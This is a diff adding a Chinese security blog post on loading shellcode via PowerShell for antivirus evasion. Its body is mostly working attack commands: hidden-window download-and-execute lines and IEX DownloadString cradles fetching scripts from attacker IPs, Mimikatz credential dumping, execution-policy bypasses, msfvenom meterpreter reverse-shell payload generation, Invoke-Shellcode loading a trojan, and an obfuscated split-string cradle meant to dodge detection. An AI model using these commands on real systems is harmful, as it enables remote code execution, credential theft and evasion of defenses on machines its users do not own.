@@ -1,0 +1,725 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介总所周知，powershell 是windows 最强大的后门，现在就尝试使用这个后门进行加载shellcode powershell 记载shellcde 可以分为两种方式，第一个方式就是无文件落地的方式，内存加载第二种方式就是使用先下载到本地文件，然后再加载 前情提要远程加载1cmd.exe &#x2F;c powershell.exe -ExecutionPolicy bypass -noprof">
+<meta property="og:type" content="article">
+<meta property="og:title" content="powershell加载shellcode">
+<meta property="og:url" content="https://tsy244.github.io/2024/10/26/%E5%85%8D%E6%9D%80/powershell%E5%8A%A0%E8%BD%BDshellcode/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介总所周知，powershell 是windows 最强大的后门，现在就尝试使用这个后门进行加载shellcode powershell 记载shellcde 可以分为两种方式，第一个方式就是无文件落地的方式，内存加载第二种方式就是使用先下载到本地文件，然后再加载 前情提要远程加载1cmd.exe &#x2F;c powershell.exe -ExecutionPolicy bypass -noprof">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027111259.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112339.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112538.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112824.png">
+<meta property="article:published_time" content="2024-10-26T03:21:36.000Z">
+<meta property="article:modified_time" content="2024-10-28T06:53:49.058Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027111259.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>powershell加载shellcode - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="powershell加载shellcode"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-26 11:21" pubdate>
+          October 26, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">powershell加载shellcode</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>总所周知，powershell 是windows 最强大的后门，现在就尝试使用这个后门进行加载shellcode</p>
+<p>powershell 记载shellcde 可以分为两种方式，第一个方式就是无文件落地的方式，内存加载<br>第二种方式就是使用先下载到本地文件，然后再加载</p>
+<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><h2 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd.exe /c powershell.exe <span class="hljs-literal">-ExecutionPolicy</span> bypass <span class="hljs-literal">-noprofile</span> <span class="hljs-literal">-windowstyle</span> <span class="hljs-keyword">hidden</span> (<span class="hljs-built_in">new-ob</span> ject system.net.webclient).downloadfile(<span class="hljs-string">&#x27;http://127.0.0.1:8089&#x27;</span>,<span class="hljs-string">&#x27;notepad.exe&#x27;</span>);<span class="hljs-built_in">start-process</span> notepad.exe<br></code></pre></td></tr></table></figure>
+
+<h2 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h2><ol>
+<li>先将文件下载到本地</li>
+<li>然后使用 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Mimikatz</span>.ps1<br></code></pre></td></tr></table></figure></li>
+<li>然后使用命令 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h1><p>powershell 默认的执行策略是不允许执行脚本的，只有设置成高权限才行或者是使用bypass</p>
+<p>下面简单介绍一下具体的有哪些权限</p>
+<h2 id="所有执行策略"><a href="#所有执行策略" class="headerlink" title="所有执行策略"></a>所有执行策略</h2><p><code>Unrestricted</code> 权限最高，可以不受限制执行任意脚本<br><code>Restricted</code> 默认策略，不允许任意脚本的执行<br><code>AllSigned</code> 所有脚本必须经过签名运行<br><code>RemoteSigned</code> 本地脚本无限制，但是对来自网络的脚本必须经过签名<br><code>Bypass</code> 没有任何限制和提示<br><code>Undefined</code> 没有设置脚本的策略</p>
+<h2 id="绕过执行策略"><a href="#绕过执行策略" class="headerlink" title="绕过执行策略"></a>绕过执行策略</h2><h3 id="有管理远权限直接设置"><a href="#有管理远权限直接设置" class="headerlink" title="有管理远权限直接设置"></a>有管理远权限直接设置</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-built_in">Set-ExecutionPolicy</span> Unrestricted   <br><br></code></pre></td></tr></table></figure>
+
+<h3 id="本地读取然后通过管道符进行加载"><a href="#本地读取然后通过管道符进行加载" class="headerlink" title="本地读取然后通过管道符进行加载"></a>本地读取然后通过管道符进行加载</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-Content</span> <span class="hljs-number">1</span>.ps1 | powershell <span class="hljs-literal">-NoProfile</span> -<br></code></pre></td></tr></table></figure>
+
+<h3 id="远程下载并通过IEX运行脚本"><a href="#远程下载并通过IEX运行脚本" class="headerlink" title="远程下载并通过IEX运行脚本"></a>远程下载并通过IEX运行脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://ip/ps/a.ps1&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="Bypass执行策略绕过"><a href="#Bypass执行策略绕过" class="headerlink" title="Bypass执行策略绕过"></a><strong>Bypass执行策略绕过</strong></h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">powershell -ExecutionPolicy bypass -<span class="hljs-built_in">File</span> ./a.ps1<br></code></pre></td></tr></table></figure>
+
+<p>不会有任何提示信息</p>
+<h3 id="Unrestricted执行策略标志"><a href="#Unrestricted执行策略标志" class="headerlink" title="Unrestricted执行策略标志"></a>Unrestricted执行策略标志</h3><p>这个方式和第一个方式一样，本质一样</p>
+<p>但是这个方式，如果加载没有被签名的脚本可能会被提醒</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ExecutionPolicy</span> unrestricted <span class="hljs-operator">-File</span> ./a.ps1<br></code></pre></td></tr></table></figure>
+
+<h1 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h1><h2 id="直接使用msf-powershell-脚本"><a href="#直接使用msf-powershell-脚本" class="headerlink" title="直接使用msf powershell 脚本"></a>直接使用msf powershell 脚本</h2><ol>
+<li><p>版本1</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.79.137  lport=24401 -f psh -o 24401.ps1<br></code></pre></td></tr></table></figure>
+<p> 然后直接使用windows 进行加载<br> 文件落地直接被杀<br> 如果发现没有被杀，可以试试</p>
+ <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-literal">-NoExit</span> <span class="hljs-operator">-File</span> shell.ps1<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>版本2</p>
+ <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msfvenom <span class="hljs-literal">-p</span> windows/x64/meterpreter/reverse_https <span class="hljs-literal">-e</span> x86/shikata_ga_nai <span class="hljs-literal">-i</span> <span class="hljs-number">15</span> <span class="hljs-literal">-b</span> <span class="hljs-string">&#x27;\x00&#x27;</span> lhost=<span class="hljs-number">10.211</span>.<span class="hljs-number">55.2</span> lport=<span class="hljs-number">3333</span> <span class="hljs-operator">-f</span> psh <span class="hljs-literal">-o</span> shell.ps1<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Invoke-Shellcode"><a href="#Invoke-Shellcode" class="headerlink" title="Invoke-Shellcode"></a>Invoke-Shellcode</h2><p>可以使用invoke-shellcode 的方式进行加载<br>本质就是一个shellcode 加载器</p>
+<p>先创建一个反向的shellcode </p>
+<p>具体的命令可以是</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&quot;</span>) <br><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://10.211.55.2/shell.ps1&quot;</span>) <br><br><span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-Shellcode</span> (<span class="hljs-variable">$buf</span>) <span class="hljs-literal">-Force</span> 运行木马<br></code></pre></td></tr></table></figure>
+
+
+<p>除了直接加载还可以加载dll </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/64079.html">Powershell tricksCode Execution &amp; Process Injection | CN-SEC 中文网</a></p>
+</blockquote>
+<h2 id="Invoke-Obfuscation对ps1免杀"><a href="#Invoke-Obfuscation对ps1免杀" class="headerlink" title="Invoke-Obfuscation对ps1免杀"></a>Invoke-Obfuscation对ps1免杀</h2><p>powershell的免杀方法有很多，对代码进行编码是最常见的一种，这里介绍一个专门用来对powershell进行编码免杀的框架Invoke-Obfuscation，这也是著名的APT32组织海莲花常用的一个工具。</p>
+<p>Invoke-Obfuscation主要是对ps1脚本进行免杀，所以这里还是需要现有一个ps的payload，我还是用法1的msf生成的payload。</p>
+<p>可以先将工具下载下来<br>有两种方式，可以是内存加载，无文件落地，或者是可以使用git cone先保存到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">git clone https://github.com/danielbohannon/Invoke-Obfuscation<br></code></pre></td></tr></table></figure>
+
+
+<p>然后执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1; <span class="hljs-built_in">Invoke-Obfuscation</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027111259.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>这个是加载之后的样子</p>
+<p>尝试将shellcode j进行编码<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112339.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>然后输入encoding</p>
+<p>然后选择编码方式<br>然后输入方法<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112538.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后输入out path就可以导出<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112824.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>然后就可以尝试进行加载</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-NoExit</span> <span class="hljs-string">&quot;<span class="hljs-variable">$c1</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="hljs-variable">$c2</span>=&#x27;123(&#x27;&#x27;http://10.211.55.2/shell.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="hljs-variable">$c1</span>+<span class="hljs-variable">$c2</span>)&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>powershell加载shellcode</div>
+      <div>https://tsy244.github.io/2024/10/26/免杀/powershell加载shellcode/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 26, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/28/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/W1R3S-1-0-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="W1R3S:1.0.1打靶记录">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">W1R3S:1.0.1打靶记录</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/25/go/gock/" title="gock">
+                        <span class="hidden-mobile">gock</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
